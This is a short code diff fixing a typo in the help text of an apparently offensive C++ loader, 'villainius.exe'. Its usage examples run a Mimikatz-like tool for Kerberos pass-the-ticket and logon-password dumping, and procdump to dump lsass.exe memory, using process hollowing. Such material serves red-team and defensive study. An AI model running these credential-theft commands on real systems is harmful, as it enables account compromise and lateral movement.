@@ -84,7 +84,7 @@ std::int_fast32_t main(std::int_fast32_t argc, char* argv[])
 		"                       with the official version of the embedded executable.\n"
 		"                       This must be the *final* option.\n\n"
 		"Examples:\n\n"
-		"  villainius.exe -e mimikats -l createproc -m KEREROS::PTT <username>@krbtgt-<domainname.tld>.kirbi\n"
+		"  villainius.exe -e mimikats -l createproc -m KERBEROS::PTT <username>@krbtgt-<domainname.tld>.kirbi\n"
 		"  villainius.exe -p 15 -e mimikats -l hollowing -m SEKURLSA::LogonPasswords full\n"
 		"  villainius.exe -e procdump -l psenccmd -m -ma lsass.exe lsass.dmp\n"
 		"  villainius.exe -p 15 -e procdump -l psstartproc -m -ma lsass.exe lsass.dmp\n"
